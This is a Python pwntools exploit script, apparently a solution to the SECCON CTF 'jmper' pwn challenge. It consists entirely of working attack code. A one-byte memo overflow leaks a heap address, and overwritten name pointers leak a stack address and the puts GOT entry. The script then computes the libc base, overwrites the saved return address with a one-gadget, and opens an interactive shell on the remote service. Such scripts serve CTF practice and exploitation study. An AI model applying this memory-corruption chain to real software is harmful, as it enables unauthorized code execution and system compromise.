#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

if DEBUG:
    magicOffset = 0xd6e77
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    magicOffset = 0xe66bd
    libc = ELF("libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e")

putsGOT = 0x601fa0

logger = logging.getLogger()
logger.setLevel(logging.DEBUG) # set to INFO in release mode

###

if DEBUG:
    r = process("./jmper")
else:
    r = remote("jmper.pwn.seccon.jp", 5656)

def add_student():
    global r

    r.sendline("1")
    r.recvuntil(":)\n")

def add_name(id, name):
    global r

    r.sendline("2")
    r.recvuntil("ID:")
    r.sendline(str(id))
    r.recvuntil("name:")
    r.send(name)
    r.recvuntil(":)\n")

def add_memo(id, memo):
    global r

    r.sendline("3")
    r.recvuntil("ID:")
    r.sendline(str(id))
    r.recvuntil("memo:")
    r.send(memo)
    r.recvuntil(":)\n")

def show_name(id):
    global r

    r.sendline("4")
    r.recvuntil("ID:")
    r.sendline(str(id))
    data = r.recvuntil("1.")[:-2]
    r.recvuntil(":)\n")
    return data

def show_memo(id):
    global r

    r.sendline("5")
    r.recvuntil("ID:")
    r.sendline(str(id))
    data = r.recvuntil("1.")[:-2]
    r.recvuntil(":)\n")
    return data


r.recvuntil("6.")
r.recvline()
add_student()
add_name(0, "toto\n")
add_memo(0, "B" * 32 + "\x78") # we get a pointer to the name ptr of next created student
data = show_memo(0)
i = 0
while data[i] == "B":
    i += 1
leak = ""
while i < len(data):
    leak += data[i]
    i += 1
leak = leak.ljust(8, "\x00")
leak = u64(leak)
baseHeap = leak - 0x278
log.info("heap leak: %#x" % leak)
log.info("baseHeap: %#x" % baseHeap)

add_student()
add_name(1, "CCCCCCCCC\n")
add_memo(1, "DDDDDDDDD\n")

# leak stack
add_name(0, p64(baseHeap + 0x128) + "\n") # rewrite second student ptr to name
data = show_name(1)
data = u64(data.ljust(8, "\x00"))
log.info("stack leak: %#x" % data)

# leak puts GOT
add_name(0, p64(putsGOT) + "\n") # rewrite second student ptr to name
puts = show_name(1)
puts = u64(puts.ljust(8, "\x00"))
log.info("puts leak: %#x" % puts)

eip = data - 0xd8
log.info("eip: %#x" % eip)

# rewriting EIP
libcBase = puts - libc.symbols["puts"]
magic = libcBase + magicOffset
log.info("libcBase: %#x" % libcBase)
log.info("magic: %#x" % magic)
ROP = p64(magic)

add_name(0, p64(eip) + "\n") # rewrite second student ptr to name
add_name(1, ROP + "\n")

#gdb.attach(r, "b *main+163")

# triggering exploit
for x in xrange(29):
    add_student()

r.interactive()
